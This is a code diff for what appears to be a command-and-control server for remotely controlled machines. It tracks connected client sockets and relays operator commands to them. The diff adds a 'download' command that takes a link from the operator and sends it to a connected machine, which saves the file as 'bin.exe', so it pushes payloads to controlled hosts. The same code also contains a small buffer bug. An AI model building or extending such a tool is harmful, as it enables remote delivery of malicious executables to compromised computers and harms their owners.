@@ -43,7 +43,6 @@
 
 					t_sock++;
 					read(fd[0], readBuf, sizeof(readBuf));
-					printf("\n\n\n%s\n\n\n", readBuf);
 					int temp_s = atoi(readBuf);
 					*(serverThread.saved_sockets+t_sock) = temp_s;
 
@@ -94,7 +93,6 @@ int connection_handler(int t, struct server_info * inf)
 	printPrompt(s);
 
 	return commandInterpreter(inf, &t);;
-
 
 }
 
@@ -201,7 +199,13 @@ void printPrompt(int s)
  */
 void help()
 {
-
+	if (serverThread.cmd){
+		printf("Help:\n");
+		printf("	- Help -> show this message\n");
+		printf("	- update -> accept new connection!\n");
+		printf("	- download -> download a file as bin.exe\n");
+		printf("	change its name if you want an other extention\n");
+	}
 }
 
 /*
@@ -210,6 +214,32 @@ void help()
 void whoami()
 {
 
+}
+
+/*
+ * download file as bin.exe
+ */
+void download(int sock)
+{
+	char dlbuf[3] = "**\n";
+	char readPrompt[10];
+	char link[BUFSIZE];
+	write(sock, dlbuf, strlen(dlbuf));
+
+	read(sock, readPrompt, sizeof(readPrompt));
+	if(serverThread.cmd){
+		printf("%s ", readPrompt);
+		fgets(link, BUFSIZE, stdin);
+	} else if(serverThread.ncurses){
+
+	}
+	write(sock, link, strlen(link));
+	read(sock, readPrompt, sizeof(readPrompt));
+	if(serverThread.cmd){
+		printf("[*] File downloaded\n");
+	} else if(serverThread.ncurses){
+
+	}
 }
 
 /*
@@ -263,6 +293,10 @@ int commandInterpreter(struct server_info * inf, int * t)
 	} else if(!strcmp(serverThread.buf, "update\n")){
 
 		return 2;
+
+	} else if(!strcmp(serverThread.buf, "download\n")){
+
+		download(*(serverThread.saved_sockets+inc));
 
 	} else {
 		write(*(serverThread.saved_sockets+inc), serverThread.buf, strlen(serverThread.buf));
